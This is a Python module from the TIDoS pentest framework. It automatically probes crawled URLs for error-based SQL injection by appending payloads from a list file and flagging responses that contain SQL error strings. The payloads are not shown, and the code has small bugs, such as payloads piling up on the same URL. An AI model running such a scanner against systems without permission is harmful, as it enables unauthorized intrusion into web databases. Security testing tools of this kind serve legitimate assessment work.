# coding: utf-8
#!/usr/bin/env python

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#Author: @_tID
#This script is a part of TIDoS Framework
#https://github.com/theInfectedDrake/TIDoS-Framework

from re import search, sub
import http.cookiejar
import requests
import time
import re
import os
import sys
from re import *
from core.Core.colors import *
from time import sleep

params = []
ctr=0
path_list = []
payloads = []

def errorsqlsearch(web):

    os.system('clear')
    print(R+'\n    ======================================')
    print(R+'     S Q L i   H U N T E R (Auto Awesome)')
    print(R+'    ======================================')
    print(R+'  [It is recommended to run ScanEnum/Crawlers  ')
    print(R+'          before using this module] \n')

    with open('files/payload-db/errorsql_payloads.lst','r') as pay:
        for payload in pay:
            rem = payload
            rem = rem.replace('\n','')
            payloads.append(rem)

    web0 = web.replace('https://','')
    web0 = web.replace('http://','')
    try:
        with open('tmp/logs/'+web0+'-logs/'+web0+'-links.lst','r') as ro:
            for r in ro:
                r = r.replace('\n','')
                path_list.append(r)
    except IOError:
        print(R+' [-] Path file not found!')

    def sqli_func(bugs):

        global ctr
        ctr = 0
        print(B+' [*] Testing '+C+bugs)
        if '?' in str(bugs) and '=' in str(bugs):
            for p in payloads:
                bugs = bugs + str(p)
                print(B+" [*] Trying : "+C+ bugs)
                time.sleep(0.7)
                response = requests.get(bugs).text
                if (('error' in response) and ('syntax' in response) or ('SQL'.lower() in response.lower())):
                    print('\n'+G+' [+] Vulnerable link detected : ' + web)
                    print(R+' [*] Injecting payloads...')
                    print(B+' [!] PoC : ' + str(bugs))
                    print(R+" [!] Payload : " + O + p + '\033[0m')
                    print("\033[1m [!] Code Snippet : \n\033[0m" + response + '\n')
                    ctr = ctr + 1
        else:
            print(''+GR+' [-] Link without parameter : '+B+'' + str(bugs))

    for urli in path_list:
        sqli_func(urli)
